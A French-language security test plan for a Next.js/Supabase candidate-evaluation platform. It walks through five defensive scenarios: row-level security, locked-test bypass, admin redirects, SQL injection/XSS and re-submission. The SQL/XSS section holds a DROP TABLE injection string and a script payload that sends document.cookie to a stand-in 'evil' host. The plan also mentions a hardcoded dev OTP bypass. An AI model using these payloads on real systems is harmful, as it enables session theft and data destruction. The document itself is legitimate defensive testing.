# SECURITY_TESTS.md — HID AI

> Référence : 5 scénarios listés dans `TODO.md` (section V2). Ce document décrit la **menace**, l'**endroit où la défense est appliquée dans le code**, et **comment le vérifier** (automatique + manuel).

## Modèle de menace en deux lignes

HID AI manipule trois types de données sensibles : (a) PII candidats Talents (KYC, téléphone, scores), (b) données B2B contractualisables, (c) accès admin (Lucien / Mark). Le surface d'attaque réel est : middleware Next + API routes + RLS Supabase. Le service-role JWT ne sort jamais du serveur — toutes les écritures privilégiées passent par des routes Next.js authentifiées.

## TL;DR — exécuter les tests automatisés

```bash
# 1. Dev server (env .env.local complet — Supabase + Resend optionnel)
npm run dev          # par défaut http://localhost:3001

# 2. Dans un autre terminal :
node scripts/security-tests.mjs
# (ou pointer ailleurs : node scripts/security-tests.mjs --base=http://localhost:3000)
```

Le script crée à la volée des comptes jetables (`hid-sec.local`), joue les 5 scénarios, et retourne un code de sortie **0** si tout passe.

---

## S1 — RLS : un candidat ne peut pas lire les données d'un autre

**Menace.** User B tente de lire `evaluation_sessions` ou `test_results` de User A en attaquant directement l'API REST Supabase avec son propre JWT. C'est l'exfiltration la plus probable (scores, PII candidats).

**Défense.**
- `supabase/migrations/0003_evaluation.sql:74-89` — `enable row level security` sur `evaluation_sessions` et `test_results`, policies `select_own` filtrent sur `auth.uid()`.
- Aucune policy `INSERT/UPDATE` publique → seul le service-role (côté serveur Next) écrit. Les API routes valident `auth.uid()` avant de toucher la DB (`app/api/evaluation/submit-test/route.js:24-30`).

**Test automatisé.** `scripts/security-tests.mjs` → S1a/S1b/S1c.
1. Crée deux talents `usrA` et `usrB`.
2. Extrait le JWT de B depuis les cookies (`@supabase/ssr` → `sb-…-auth-token`).
3. Avec ce JWT, fait 3 SELECT directs sur l'API REST Supabase :
   - `evaluation_sessions` → ne doit renvoyer **que** la ligne de B.
   - `evaluation_sessions?id=eq.<sessionId-de-A>` → doit renvoyer `[]` (RLS bloque).
   - `test_results` → aucune ligne avec `session_id = <session-de-A>`.

**Test manuel via Supabase SQL Editor** (le gold standard).
```sql
-- 1. Récupérer l'UUID de deux talents distincts
select id, email from auth.users where email like '%hid-sec.local%' order by created_at desc limit 5;

-- 2. Se mettre dans la peau de B en forçant le JWT (replace UUID)
set local request.jwt.claims to '{"sub": "<UUID-DE-B>", "role": "authenticated"}';

-- 3. Doit retourner UNIQUEMENT les lignes de B
select user_id, status from public.evaluation_sessions;
select session_id, test_slug from public.test_results;

-- 4. Reset
reset request.jwt.claims;
```

**Évidence à capturer** : screenshot du SELECT renvoyant 0 row de A, ou logs du script avec `S1b. ✅`.

---

## S2 — POST direct sur un test verrouillé → 403

**Menace.** Un candidat malin appelle `POST /api/evaluation/submit-test { test_slug: "rag" }` sans avoir passé les 7 tests précédents, pour griller un test difficile en bypassant la linéarité.

**Défense.** `app/api/evaluation/submit-test/route.js:66-72` — refuse explicitement les lignes `status = 'locked'` :

```js
if (testRow.status === "locked") {
  return NextResponse.json(
    { error: "Test is locked. Complete previous tests first." },
    { status: 403 }
  );
}
```

**Test automatisé.** Crée un compte fraîchement inscrit (seul `computer-vision` est `available`, les 7 autres `locked`), POST `submit-test` avec `test_slug = "rag"` → attend HTTP 403 + message contenant "lock".

**Test manuel via curl** (après OTP bypass) :
```bash
curl -i -X POST http://localhost:3001/api/evaluation/submit-test \
  -H "Content-Type: application/json" \
  -b "<cookies>" \
  -d '{"test_slug":"rag","raw_answers":{},"time_spent_seconds":1}'
# HTTP/1.1 403 Forbidden
# {"error":"Test is locked. Complete previous tests first."}
```

---

## S3 — Non-admin sur `/admin/*` → redirect

**Menace.** Un user authentifié (talent ou B2B), ou un anon, devine une URL `/admin/entreprises` et accède au dashboard. Pire : tape une API admin (`PATCH /api/admin/b2b/:id`).

**Défense (deux couches).**
1. **Middleware** (`middleware.js:31-55`) — pour les **pages** :
   - Anon sur `/admin/*` → 307 vers `/login?next=/admin/…`
   - Authentifié mais non listé dans `public.admin_users` → 307 vers `/?error=admin-required`
2. **`requireAdmin()` côté API** (`lib/admin/guard.js`) — pour les **routes API admin** :
   - Anon → 401 `Not authenticated`
   - Authentifié non-admin → 403 `Admin required`

**Test automatisé.** S3a/S3b/S3c/S3d couvrent les quatre combinaisons (page × auth).

**Test manuel.**
```bash
# 3a — Anon
curl -i -L --max-redirs 0 http://localhost:3001/admin/entreprises   # 307 + Location=/login

# 3b — Authentifié non-admin (cookies après OTP)
curl -i -L --max-redirs 0 -b "<cookies>" http://localhost:3001/admin/entreprises
# 307 + Location=/?error=admin-required

# 3c — API admin sans rôle
curl -i -X PATCH -H "Content-Type: application/json" -b "<cookies>" \
  -d '{"status":"won"}' http://localhost:3001/api/admin/b2b/00000000-0000-0000-0000-000000000000
# 403 {"error":"Admin required"}
```

---

## S4 — Injection SQL / XSS sur champs texte

**Menace.** Un attaquant envoie `'); DROP TABLE inscriptions_b2b; --` ou `<script>fetch('https://evil/?='+document.cookie)</script>` dans `raison_sociale` du formulaire B2B. Si la requête SQL est concaténée ou si le HTML est rendu non-échappé côté admin, on a soit destruction, soit vol de session admin.

**Défense.**
- **SQL** : tous les écritures DB passent par `@supabase/supabase-js` qui utilise PostgREST en paramètres préparés — pas de concaténation. `app/api/inscription-b2b/route.js` ne fait aucun `string templating` SQL.
- **XSS** : React échappe `{value}` par défaut. Le dashboard admin (`app/(admin)/admin/entreprises/page.js:156`) interpole `{r.raison_sociale}` dans une `<td>`, donc auto-escape. Aucun `dangerouslySetInnerHTML` dans `app/` ou `components/` (`grep -rn dangerouslySetInnerHTML app components` → 0 hit).

**Test automatisé.** S4a/S4b/S4c :
- POST `inscription-b2b` avec `raison_sociale = "<script>alert('xss')</script>'); DROP TABLE inscriptions_b2b; --"` → 200/201.
- SELECT service-role → stocké **verbatim** (string identique à l'entrée).
- Count `inscriptions_b2b` → table existe toujours (`count > 0`).

**Test manuel supplémentaire (XSS rendu)** :
1. Login admin, va sur `/admin/entreprises`.
2. Visuel : le `<script>` apparaît comme **texte gris** dans la cellule (pas exécuté).
3. Ouvre DevTools > Elements et confirme que les `<` sont rendus en `&lt;`.

**Évidence à capturer** : screenshot de l'admin avec le script visible en texte + console DevTools sans `alert()`.

---

## S5 — Re-submit d'un test déjà passé → 409

**Menace.** Un candidat passe un test à 65/100 (passé), puis le rejoue avec de meilleures réponses pour gonfler son `ai_native_score`. Ou pire : un test passé à 100 est rejoué pour effacer son historique.

**Défense.** `app/api/evaluation/submit-test/route.js:77-86` :

```js
if (testRow.status === "completed") {
  if ((testRow.score ?? 0) >= testDef.passing_score) {
    return NextResponse.json(
      { error: "Test already passed — no retry allowed" },
      { status: 409 }
    );
  }
  // sinon on passe : c'est un retry après échec
}
```

Asymétrie volontaire : un test **échoué** est rejouable (UX), un test **passé** est figé (intégrité du score).

**Test automatisé.** S5 :
1. Setup talent + session.
2. PATCH service-role : `test_results { status='completed', score=100 }` pour `computer-vision`.
3. POST `submit-test { test_slug: "computer-vision" }` → attend HTTP 409 + message "already passed".

**Test manuel.** Passer un test à 100% en jouant les vraies réponses → tenter de le re-soumettre depuis l'UI → l'API renvoie 409 et l'UI doit afficher l'erreur côté front (à vérifier visuellement).

---

## Routine recommandée

| Quand                           | Action                                                                |
| ------------------------------- | --------------------------------------------------------------------- |
| Avant chaque déploiement Vercel | `node scripts/security-tests.mjs` contre prévisualisation             |
| Après chaque migration SQL      | Re-jouer S1 manuellement via Supabase SQL Editor                      |
| Après chaque release admin      | Re-vérifier S3a/S3b en navigation privée + browser                    |
| Trimestriel                     | Audit dépendances : `npm audit` + revue des PRs `@supabase/*`         |

## Hors scope explicite

- **Bruteforce OTP** — couvert par Twilio rate-limit (en prod) ; en dev, le bypass `000000` est intentionnel et **doit être retiré avant prod** (`app/api/auth/verify-otp/route.js:143-164`).
- **CSRF** — Next.js App Router + cookies SameSite=Lax + tokens d'auth Supabase JWT → pas de surface CSRF classique sur les API.
- **Upload de fichiers malveillants** (KYC) — le bucket Supabase Storage est privé, signed URL côté serveur uniquement. À auditer séparément si on autorise des types non-image.
